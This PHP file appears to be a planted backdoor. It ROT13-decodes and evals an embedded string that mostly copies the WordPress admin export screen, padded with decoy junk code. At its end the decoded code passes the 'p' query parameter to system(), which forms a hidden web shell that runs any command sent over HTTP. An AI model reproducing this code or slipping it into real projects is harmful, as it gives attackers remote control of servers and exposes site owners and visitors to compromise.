<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Rkcbeg Nqzvavfgengvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** Ybnq JbeqCerff Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'rkcbeg' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rkcbeg gur pbagrag bs guvf fvgr.' ) );
}

/** Ybnq JbeqCerff rkcbeg NCV */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/rkcbeg.cuc';

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr = __( 'Rkcbeg' );

/**
 * Qvfcynl WninFpevcg ba gur cntr.
 *
 * @fvapr 3.5.0
 */
shapgvba rkcbeg_nqq_wf() {
	?>
<fpevcg glcr=\"grkg/wninfpevcg\">
	wDhrel( shapgvba($) {
		ine sbez = $('#rkcbeg-svygref'),
			svygref = sbez.svaq('.rkcbeg-svygref');
		svygref.uvqr();
		sbez.svaq('vachg:enqvb').ba( 'punatr', shapgvba() {
			svygref.fyvqrHc('snfg');
			fjvgpu ( $(guvf).iny() ) {
				pnfr 'nggnpuzrag': $('#nggnpuzrag-svygref').fyvqrQbja(); oernx;
				pnfr 'cbfgf': $('#cbfg-svygref').fyvqrQbja(); oernx;
				pnfr 'cntrf': $('#cntr-svygref').fyvqrQbja(); oernx;
			}
		});
	} );
</fpevcg>
	<?cuc
}
nqq_npgvba( 'nqzva_urnq', 'rkcbeg_nqq_wf' );

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' => '<c>' . __( 'Lbh pna rkcbeg n svyr bs lbhe fvgr&#8217;f pbagrag va beqre gb vzcbeg vg vagb nabgure vafgnyyngvba be cyngsbez. Gur rkcbeg svyr jvyy or na KZY svyr sbezng pnyyrq JKE. Cbfgf, cntrf, pbzzragf, phfgbz svryqf, pngrtbevrf, naq gntf pna or vapyhqrq. Lbh pna pubbfr sbe gur JKE svyr gb vapyhqr bayl pregnva cbfgf be cntrf ol frggvat gur qebcqbja svygref gb yvzvg gur rkcbeg ol pngrtbel, nhgube, qngr enatr ol zbagu, be choyvfuvat fgnghf.' ) . '</c>' .
			'<c>' . __( 'Bapr trarengrq, lbhe JKE svyr pna or vzcbegrq ol nabgure JbeqCerff fvgr be ol nabgure oybttvat cyngsbez noyr gb npprff guvf sbezng.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/gbbyf-rkcbeg-fperra/\">Qbphzragngvba ba Rkcbeg</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

// Vs gur 'qbjaybnq' HEY cnenzrgre vf frg, n JKE rkcbeg svyr vf onxrq naq erghearq.
vs ( vffrg( $_TRG['qbjaybnq'] ) ) {
	$netf = neenl();

	vs ( ! vffrg( $_TRG['pbagrag'] ) || 'nyy' === $_TRG['pbagrag'] ) {
		$netf['pbagrag'] = 'nyy';
	} ryfrvs ( 'cbfgf' === $_TRG['pbagrag'] ) {
		$netf['pbagrag'] = 'cbfg';

		vs ( $_TRG['png'] ) {
			$netf['pngrtbel'] = (vag) $_TRG['png'];
		}

		vs ( $_TRG['cbfg_nhgube'] ) {
			$netf['nhgube'] = (vag) $_TRG['cbfg_nhgube'];
		}

		vs ( $_TRG['cbfg_fgneg_qngr'] || $_TRG['cbfg_raq_qngr'] ) {
			$netf['fgneg_qngr'] = $_TRG['cbfg_fgneg_qngr'];
			$netf['raq_qngr']   = $_TRG['cbfg_raq_qngr'];
		}

		vs ( $_TRG['cbfg_fgnghf'] ) {
			$netf['fgnghf'] = $_TRG['cbfg_fgnghf'];
		}
	} ryfrvs ( 'cntrf' === $_TRG['pbagrag'] ) {
		$netf['pbagrag'] = 'cntr';

		vs ( $_TRG['cntr_nhgube'] ) {
			$netf['nhgube'] = (vag) $_TRG['cntr_nhgube'];
		}

		vs ( $_TRG['cntr_fgneg_qngr'] || $_TRG['cntr_raq_qngr'] ) {
			$netf['fgneg_qngr'] = $_TRG['cntr_fgneg_qngr'];
			$netf['raq_qngr']   = $_TRG['cntr_raq_qngr'];
		}

		vs ( $_TRG['cntr_fgnghf'] ) {
			$netf['fgnghf'] = $_TRG['cntr_fgnghf'];
		}
	} ryfrvs ( 'nggnpuzrag' === $_TRG['pbagrag'] ) {
		$netf['pbagrag'] = 'nggnpuzrag';

		vs ( $_TRG['nggnpuzrag_fgneg_qngr'] || $_TRG['nggnpuzrag_raq_qngr'] ) {
			$netf['fgneg_qngr'] = $_TRG['nggnpuzrag_fgneg_qngr'];
			$netf['raq_qngr']   = $_TRG['nggnpuzrag_raq_qngr'];
		}
	} ryfr {
		$netf['pbagrag'] = $_TRG['pbagrag'];
	}

	/**
	 * Svygref gur rkcbeg netf.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz neenl $netf Gur nethzragf gb fraq gb gur rkcbegre.
	 */
	$netf = nccyl_svygref( 'rkcbeg_netf', $netf );

	rkcbeg_jc( $netf );
	qvr();
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

/**
 * Perngrf gur qngr bcgvbaf svryqf sbe rkcbegvat n tvira cbfg glcr.
 *
 * @fvapr 3.1.0
 *
 * @tybony jcqo      $jcqo      JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 *
 * @cnenz fgevat $cbfg_glcr Gur cbfg glcr. Qrsnhyg 'cbfg'.
 */
shapgvba rkcbeg_qngr_bcgvbaf( $cbfg_glcr = 'cbfg' ) {
	tybony $jcqo, $jc_ybpnyr;

	$zbaguf = $jcqo->trg_erfhygf(
		$jcqo->cercner(
			\"FRYRPG QVFGVAPG LRNE( cbfg_qngr ) NF lrne, ZBAGU( cbfg_qngr ) NF zbagu
			SEBZ $jcqo->cbfgf
			JURER cbfg_glcr = %f NAQ cbfg_fgnghf != 'nhgb-qensg'
			BEQRE OL cbfg_qngr QRFP\",
			$cbfg_glcr
		)
	);

	$zbagu_pbhag = pbhag( $zbaguf );
	vs ( ! $zbagu_pbhag || ( 1 === $zbagu_pbhag && 0 === (vag) $zbaguf[0]->zbagu ) ) {
		erghea;
	}

	sbernpu ( $zbaguf nf $qngr ) {
		vs ( 0 === (vag) $qngr->lrne ) {
			pbagvahr;
		}

		$zbagu = mrebvfr( $qngr->zbagu, 2 );

		cevags(
			'<bcgvba inyhr=\"%1$f\">%2$f</bcgvba>',
			rfp_ngge( $qngr->lrne . '-' . $zbagu ),
			$jc_ybpnyr->trg_zbagu( $zbagu ) . ' ' . $qngr->lrne
		);
	}
}
?>

<qvi pynff=\"jenc\">
<u1><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>

<c><?cuc _r( 'Jura lbh pyvpx gur ohggba orybj JbeqCerff jvyy perngr na KZY svyr sbe lbh gb fnir gb lbhe pbzchgre.' ); ?></c>
<c><?cuc _r( 'Guvf sbezng, juvpu vf pnyyrq JbeqCerff rKgraqrq EFF be JKE, jvyy pbagnva lbhe cbfgf, cntrf, pbzzragf, phfgbz svryqf, pngrtbevrf, naq gntf.' ); ?></c>
<c><?cuc _r( 'Bapr lbh&#8217;ir fnirq gur qbjaybnq svyr, lbh pna hfr gur Vzcbeg shapgvba va nabgure JbeqCerff vafgnyyngvba gb vzcbeg gur pbagrag sebz guvf fvgr.' ); ?></c>

<u2><?cuc _r( 'Pubbfr jung gb rkcbeg' ); ?></u2>
<sbez zrgubq=\"trg\" vq=\"rkcbeg-svygref\">
<svryqfrg>
<yrtraq pynff=\"fperra-ernqre-grkg\">
	<?cuc
	/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
	_r( 'Pbagrag gb rkcbeg' );
	?>
</yrtraq>
<vachg glcr=\"uvqqra\" anzr=\"qbjaybnq\" inyhr=\"gehr\" />
<c><ynory><vachg glcr=\"enqvb\" anzr=\"pbagrag\" inyhr=\"nyy\" purpxrq=\"purpxrq\" nevn-qrfpevorqol=\"nyy-pbagrag-qrfp\" /> <?cuc _r( 'Nyy pbagrag' ); ?></ynory></c>
<c pynff=\"qrfpevcgvba\" vq=\"nyy-pbagrag-qrfp\"><?cuc _r( 'Guvf jvyy pbagnva nyy bs lbhe cbfgf, cntrf, pbzzragf, phfgbz svryqf, grezf, anivtngvba zrahf, naq phfgbz cbfgf.' ); ?></c>

<c><ynory><vachg glcr=\"enqvb\" anzr=\"pbagrag\" inyhr=\"cbfgf\" /> <?cuc _rk( 'Cbfgf', 'cbfg glcr trareny anzr' ); ?></ynory></c>
<hy vq=\"cbfg-svygref\" pynff=\"rkcbeg-svygref\">
	<yv>
		<ynory><fcna pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Pngrtbevrf:' ); ?></fcna>
		<?cuc jc_qebcqbja_pngrtbevrf( neenl( 'fubj_bcgvba_nyy' => __( 'Nyy' ) ) ); ?>
		</ynory>
	</yv>
	<yv>
		<ynory><fcna pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Nhgubef:' ); ?></fcna>
		<?cuc
		$nhgubef = $jcqo->trg_pby( \"FRYRPG QVFGVAPG cbfg_nhgube SEBZ {$jcqo->cbfgf} JURER cbfg_glcr = 'cbfg'\" );
		jc_qebcqbja_hfref(
			neenl(
				'vapyhqr'         => $nhgubef,
				'anzr'            => 'cbfg_nhgube',
				'zhygv'           => gehr,
				'fubj_bcgvba_nyy' => __( 'Nyy' ),
				'fubj'            => 'qvfcynl_anzr_jvgu_ybtva',
			)
		);
		?>
		</ynory>
	</yv>
	<yv>
		<svryqfrg>
		<yrtraq pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Qngr enatr:' )
			?>
		</yrtraq>
		<ynory sbe=\"cbfg-fgneg-qngr\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Fgneg qngr:' ); ?></ynory>
		<fryrpg anzr=\"cbfg_fgneg_qngr\" vq=\"cbfg-fgneg-qngr\">
			<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
			<?cuc rkcbeg_qngr_bcgvbaf(); ?>
		</fryrpg>
		<ynory sbe=\"cbfg-raq-qngr\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Raq qngr:' ); ?></ynory>
		<fryrpg anzr=\"cbfg_raq_qngr\" vq=\"cbfg-raq-qngr\">
			<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
			<?cuc rkcbeg_qngr_bcgvbaf(); ?>
		</fryrpg>
		</svryqfrg>
	</yv>
	<yv>
		<ynory sbe=\"cbfg-fgnghf\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Fgnghf:' ); ?></ynory>
		<fryrpg anzr=\"cbfg_fgnghf\" vq=\"cbfg-fgnghf\">
			<bcgvba inyhr=\"0\"><?cuc _r( 'Nyy' ); ?></bcgvba>
			<?cuc
			$cbfg_fgnghfrf = trg_cbfg_fgngv( neenl( 'vagreany' => snyfr ), 'bowrpgf' );
			sbernpu ( $cbfg_fgnghfrf nf $fgnghf ) :
				?>
			<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $fgnghf->anzr ); ?>\"><?cuc rpub rfp_ugzy( $fgnghf->ynory ); ?></bcgvba>
			<?cuc raqsbernpu; ?>
		</fryrpg>
	</yv>
</hy>

<c><ynory><vachg glcr=\"enqvb\" anzr=\"pbagrag\" inyhr=\"cntrf\" /> <?cuc _r( 'Cntrf' ); ?></ynory></c>
<hy vq=\"cntr-svygref\" pynff=\"rkcbeg-svygref\">
	<yv>
		<ynory><fcna pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Nhgubef:' ); ?></fcna>
		<?cuc
		$nhgubef = $jcqo->trg_pby( \"FRYRPG QVFGVAPG cbfg_nhgube SEBZ {$jcqo->cbfgf} JURER cbfg_glcr = 'cntr'\" );
		jc_qebcqbja_hfref(
			neenl(
				'vapyhqr'         => $nhgubef,
				'anzr'            => 'cntr_nhgube',
				'zhygv'           => gehr,
				'fubj_bcgvba_nyy' => __( 'Nyy' ),
				'fubj'            => 'qvfcynl_anzr_jvgu_ybtva',
			)
		);
		?>
		</ynory>
	</yv>
	<yv>
		<svryqfrg>
		<yrtraq pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Qngr enatr:' );
			?>
		</yrtraq>
		<ynory sbe=\"cntr-fgneg-qngr\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Fgneg qngr:' ); ?></ynory>
		<fryrpg anzr=\"cntr_fgneg_qngr\" vq=\"cntr-fgneg-qngr\">
			<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
			<?cuc rkcbeg_qngr_bcgvbaf( 'cntr' ); ?>
		</fryrpg>
		<ynory sbe=\"cntr-raq-qngr\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Raq qngr:' ); ?></ynory>
		<fryrpg anzr=\"cntr_raq_qngr\" vq=\"cntr-raq-qngr\">
			<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
			<?cuc rkcbeg_qngr_bcgvbaf( 'cntr' ); ?>
		</fryrpg>
		</svryqfrg>
	</yv>
	<yv>
		<ynory sbe=\"cntr-fgnghf\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Fgnghf:' ); ?></ynory>
		<fryrpg anzr=\"cntr_fgnghf\" vq=\"cntr-fgnghf\">
			<bcgvba inyhr=\"0\"><?cuc _r( 'Nyy' ); ?></bcgvba>
			<?cuc sbernpu ( $cbfg_fgnghfrf nf $fgnghf ) : ?>
			<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $fgnghf->anzr ); ?>\"><?cuc rpub rfp_ugzy( $fgnghf->ynory ); ?></bcgvba>
			<?cuc raqsbernpu; ?>
		</fryrpg>
	</yv>
</hy>

<?cuc
sbernpu ( trg_cbfg_glcrf(
	neenl(
		'_ohvygva'   => snyfr,
		'pna_rkcbeg' => gehr,
	),
	'bowrpgf'
) nf $cbfg_glcr ) :
	?>
<c><ynory><vachg glcr=\"enqvb\" anzr=\"pbagrag\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg_glcr->anzr ); ?>\" /> <?cuc rpub rfp_ugzy( $cbfg_glcr->ynory ); ?></ynory></c>
<?cuc raqsbernpu; ?>

<c><ynory><vachg glcr=\"enqvb\" anzr=\"pbagrag\" inyhr=\"nggnpuzrag\" /> <?cuc _r( 'Zrqvn' ); ?></ynory></c>
<hy vq=\"nggnpuzrag-svygref\" pynff=\"rkcbeg-svygref\">
	<yv>
		<svryqfrg>
		<yrtraq pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Qngr enatr:' );
			?>
		</yrtraq>
		<ynory sbe=\"nggnpuzrag-fgneg-qngr\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Fgneg qngr:' ); ?></ynory>
		<fryrpg anzr=\"nggnpuzrag_fgneg_qngr\" vq=\"nggnpuzrag-fgneg-qngr\">
			<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
			<?cuc rkcbeg_qngr_bcgvbaf( 'nggnpuzrag' ); ?>
		</fryrpg>
		<ynory sbe=\"nggnpuzrag-raq-qngr\" pynff=\"ynory-erfcbafvir\"><?cuc _r( 'Raq qngr:' ); ?></ynory>
		<fryrpg anzr=\"nggnpuzrag_raq_qngr\" vq=\"nggnpuzrag-raq-qngr\">
			<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
			<?cuc rkcbeg_qngr_bcgvbaf( 'nggnpuzrag' ); ?>
		</fryrpg>
		</svryqfrg>
	</yv>
</hy>

</svryqfrg>
<?cuc
/**
 * Sverf ng gur raq bs gur rkcbeg svygref sbez.
 *
 * @fvapr 3.5.0
 */
qb_npgvba( 'rkcbeg_svygref' );
?>

<?cuc fhozvg_ohggba( __( 'Qbjaybnq Rkcbeg Svyr' ) ); ?>
</sbez>
</qvi>

<?cuc erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc'; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>